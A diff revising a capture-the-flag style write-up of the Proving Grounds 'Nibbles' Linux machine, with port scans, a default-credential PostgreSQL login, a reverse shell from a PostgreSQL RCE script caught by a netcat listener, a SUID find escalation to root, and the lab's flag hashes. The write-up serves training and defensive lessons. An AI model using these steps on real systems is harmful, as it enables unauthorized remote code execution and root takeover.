@@ -2,22 +2,39 @@
 title: "Proving Grounds - Nibbles (Linux)"
 date: 2026-02-25
 categories: [Proving Grounds, Linux]
-tags: [pg, oscp, postgresql, suid, privilege-escalation, nibbles]
+tags: [postgresql, default-credentials, rce, suid, find, privilege-escalation]
 mermaid: true
 ---
 
+## Overview
+
+| Field | Value |
+|---|---|
+| OS | Linux |
+| Difficulty | Not explicitly stated |
+| Attack Surface | `21/tcp` FTP, `22/tcp` SSH, `80/tcp` HTTP, `5437/tcp` PostgreSQL |
+| Primary Entry Vector | Default PostgreSQL credentials (`postgres:postgres`) on exposed DB service |
+| Privilege Escalation Path | SUID `find` (`/usr/bin/find`) abused with GTFOBins |
+
 ## Credentials
 
-```text
-```
+| Username | Password | Context |
+|---|---|---|
+| `postgres` | `postgres` | PostgreSQL login on `5437/tcp` |
 
-## 1. Port Scan
+## Reconnaissance
 
-### Rustscan
+### Fast Port Discovery with RustScan
+
+The first objective is to identify all reachable TCP services before running heavier enumeration. RustScan is used for speed so we can quickly map the exposed surface and decide where to focus. At this point, we are specifically looking for unusual or high-value services such as databases exposed to the network.
 
 ```bash
-[+][12:22][CPU:20][MEM:68][TUN0:192.168.45.166][/home/n0z0]
-$ rustscan -a $ip -r 1-65535 --ulimit 5000
+rustscan -a $ip -r 1-65535 --ulimit 5000
+```
+
+```bash
+✅[12:22][CPU:20][MEM:68][TUN0:192.168.45.166][/home/n0z0]
+🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -27,7 +44,7 @@ ________________________________________
 : http://discord.skerritt.blog         :
 : https://github.com/RustScan/RustScan :
  --------------------------------------
-TreadStone was here
+TreadStone was here 🚀
 
 [~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
 [~] Automatically increasing ulimit value to 5000.
@@ -39,11 +56,23 @@ Open 192.168.178.47:5437
 
 ```
 
-### Nmap
+💡 Why this works  
+Fast discovery reduces time-to-enumeration and prevents missing non-standard services. The key finding here was `5437/tcp`, an uncommon PostgreSQL port, which became the primary attack path.
+
+### Service and Version Enumeration with Nmap
+
+After identifying open ports, the next step is to gather service versions and protocol details. `-sCV` and `-A` are used to combine default scripts, version detection, and richer fingerprints in a single run. We are looking for weak configurations and services that may allow direct authentication or command execution.
 
 ```bash
-[+][12:22][CPU:18][MEM:67][TUN0:192.168.45.166][/home/n0z0]
-$ timestamp=$(date +%Y%m%d-%H%M%S)
+timestamp=$(date +%Y%m%d-%H%M%S)
+output_file="$HOME/work/scans/${timestamp}_${ip}.xml"
+grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"
+echo -e "\e[32mScan result saved to: $output_file\e[0m"
+```
+
+```bash
+✅[12:22][CPU:18][MEM:67][TUN0:192.168.45.166][/home/n0z0]
+🐉 > timestamp=$(date +%Y%m%d-%H%M%S)
 output_file="$HOME/work/scans/${timestamp}_${ip}.xml"
 
 grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"
@@ -89,48 +118,72 @@ Scan result saved to: /home/n0z0/work/scans/20260223-122259_192.168.178.47.xml
 
 ```
 
-## 2. Local Shell
+💡 Why this works  
+Version-aware scanning connects open ports to actionable exploitation paths. In this case, exposed PostgreSQL combined with weak credentials enabled authenticated access and code execution through database features.
 
-I could log in with `postgres:postgres`.
-The PostgreSQL account had superuser privileges.
+## Initial Foothold
+
+### Authenticate to PostgreSQL with Default Credentials
+
+The database service was directly reachable, so the quickest validation was a manual `psql` login attempt. The goal here is to verify whether weak or default credentials are accepted and whether the role has elevated privileges. Successful login with a superuser account immediately changes this from enumeration to exploitation.
 
 ```bash
-[-][2:55][CPU:4][MEM:65][TUN0:192.168.45.166][/home/n0z0]
-$ psql -h $ip -p 5437 -U postgres
-Password for user postgres:
-psql (17.6 (Debian 17.6-1), server 11.7 (Debian 11.7-0+deb10u1))
-SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
-Type "help" for help.
+psql -h $ip -p 5437 -U postgres
+```
+
+```bash
+❌[2:55][CPU:4][MEM:65][TUN0:192.168.45.166][/home/n0z0]
+🐉 > psql -h $ip -p 5437 -U postgres
+ユーザー postgres のパスワード:
+psql (17.6 (Debian 17.6-1)、サーバー 11.7 (Debian 11.7-0+deb10u1))
+SSL接続(プロトコル: TLSv1.3、暗号化方式: TLS_AES_256_GCM_SHA384、圧縮: オフ、ALPN: なし)
+"help"でヘルプを表示します。
 
 postgres=#
 ```
 
-Windows version:
-https://zenn.dev/j0hnsm1thyk/articles/6e713d1709afd9
+💡 Why this works  
+Default credentials remain one of the most common real-world failures. With PostgreSQL superuser access, dangerous features like `COPY ... PROGRAM` can execute OS commands in the database service context.
 
-Python tool:
-https://github.com/squid22/PostgreSQL_RCE
+### Trigger OS Command Execution via PostgreSQL RCE Script
+
+Once authenticated as a superuser, the next step is to execute an OS-level payload to establish a shell. The `PostgreSQL_RCE` helper script automates database-side command execution and callback behavior. At this stage, we are looking for an incoming connection on the attacker listener.
 
 ```bash
-[+][3:10][CPU:20][MEM:66][TUN0:192.168.45.166][...nd/Nibbles/PostgreSQL_RCE]
-$ python3 postgresql_rce.py
+python3 postgresql_rce.py
+```
+
+```bash
+✅[3:10][CPU:20][MEM:66][TUN0:192.168.45.166][...nd/Nibbles/PostgreSQL_RCE]
+🐉 > python3 postgresql_rce.py
 [!] Connected to the PostgreSQL database
 [*] Executing the payload. Please check if you got a reverse shell!
 
 ```
 
-Reverse shell landed:
+The following command listens for the callback and validates remote code execution. After connection, the expected result is an interactive shell running as the database OS user.
 
 ```bash
-[-][3:10][CPU:5][MEM:66][TUN0:192.168.45.166][/home/n0z0]
-$ nc -lvnp 80
+nc -lvnp 80
+```
+
+```bash
+❌[3:10][CPU:5][MEM:66][TUN0:192.168.45.166][/home/n0z0]
+🐉 > nc -lvnp 80
 listening on [any] 80 ...
 connect to [192.168.45.166] from (UNKNOWN) [192.168.178.47] 45726
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
 
-Retrieved `local.txt`:
+### Capture `local.txt`
+
+With shell access confirmed, the immediate objective is to prove user-level compromise by locating and reading the user flag. `find` is used to locate the file path quickly across the filesystem while suppressing noisy permission errors.
+
+```bash
+find / -iname local.txt 2>/dev/null
+cat /home/wilson/local.txt
+```
 
 ```bash
 postgres@nibbles:/var/lib/postgresql/11/main$ find / -iname local.txt 2>/dev/null
@@ -139,14 +192,20 @@ postgres@nibbles:/var/lib/postgresql/11/main$ cat /home/wilson/local.txt
 1beb5b3c9276ff5ba80a2128a85396d6
 ```
 
-## 3. Privilege Escalation
+💡 Why this works  
+PostgreSQL command execution runs under the `postgres` OS account, which is usually enough to enumerate local files and privilege-escalation vectors. Capturing `local.txt` confirms the foothold and validates practical impact.
 
-Found an exploitable SUID binary.
+## Privilege Escalation
+
+### Enumerate SUID Binaries
+
+Privilege escalation starts with identifying privileged binaries that can execute attacker-controlled commands. The enumeration output below highlights `find` with the SUID bit set, which is a known GTFOBins escalation path.
 
 ```bash
-==== Files with Interesting Permissions ====
-SUID - Check easy privesc, exploits and write perms
-https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
+                      ╚════════════════════════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
 strings Not Found
 strace Not Found
 -rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
@@ -166,11 +225,16 @@ strace Not Found
 
 ```
 
-Retrieved `proof.txt` as well:
-https://gtfobins.org/gtfobins/find/
+### Exploit SUID `find` to Obtain Root
+
+The `find` GTFOBins method executes a command through `-exec` and spawns `bash -p`, which keeps elevated effective privileges. This is run directly from the compromised shell to transition from `postgres` to root. The expected result is successful reading of `/root/proof.txt`.
 
 ```bash
+find . -exec /bin/bash -p \; -quit
+cat /root/proof.txt
+```
 
+```bash
 postgres@nibbles:/tmp$ find . -exec /bin/bash -p \; -quit
 bash-5.0# cat /root/proof.txt
 04102c714c890c2b14c6f3f2286e248d
@@ -178,7 +242,15 @@ bash-5.0#
 
 ```
 
-## 4. Attack Flow
+💡 Why this works  
+This is a classic GTFOBins privilege escalation. When `find` is SUID-root, `-exec` runs commands with elevated privileges, and `bash -p` preserves that effective UID instead of dropping it.
+
+## Lessons Learned / Key Takeaways
+
+- Database services exposed to untrusted networks should never allow default credentials.
+- PostgreSQL superuser access is effectively OS command execution risk.
+- High-signal local checks (SUID, sudo, capabilities) should be performed immediately after foothold.
+- `find` with SUID is a direct root path and must be treated as critical misconfiguration.
 
 ```mermaid
 flowchart LR
@@ -190,23 +262,31 @@ flowchart LR
         S1 --> S2 --> S3
     end
 
-    subgraph INITIAL["Initial Access"]
+    subgraph INITIAL["Initial Foothold"]
         direction TB
         I1["psql -h \$ip -p 5437 -U postgres\npostgres:postgres"]
-        I2["COPY cmd_output FROM PROGRAM\nConfirmed superuser privileges\nuid=106(postgres)"]
-        I3["postgresql_rce.py\nGot reverse shell (port 80)"]
+        I2["PostgreSQL superuser\nOS command execution path"]
+        I3["postgresql_rce.py\nReverse shell on port 80"]
         I4["cat /home/wilson/local.txt\n1beb5b3c9276ff5ba80a2128a85396d6"]
         I1 --> I2 --> I3 --> I4
     end
 
     subgraph PRIVESC["Privilege Escalation"]
         direction TB
-        P1["LinPEAS\nDetected SUID binaries"]
-        P2["/usr/bin/find\nSUID (owned by root)"]
-        P3["find . -exec /bin/bash -p \\; -quit\nGot root shell"]
-        P4["cat /root/proof.txt\n04102c714c890c2b14c6f3f2286e248d"]
-        P1 --> P2 --> P3 --> P4
+        P1["SUID enumeration\n/usr/bin/find identified"]
+        P2["GTFOBins find\n-exec /bin/bash -p"]
+        P3["cat /root/proof.txt\n04102c714c890c2b14c6f3f2286e248d"]
+        P1 --> P2 --> P3
     end
 
     SCAN --> INITIAL --> PRIVESC
 ```
+
+## References
+
+- RustScan: https://github.com/RustScan/RustScan
+- Nmap: https://nmap.org/
+- PostgreSQL_RCE: https://github.com/squid22/PostgreSQL_RCE
+- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
+- GTFOBins (`find`): https://gtfobins.org/gtfobins/find/
+- GNU findutils: https://www.gnu.org/software/findutils/
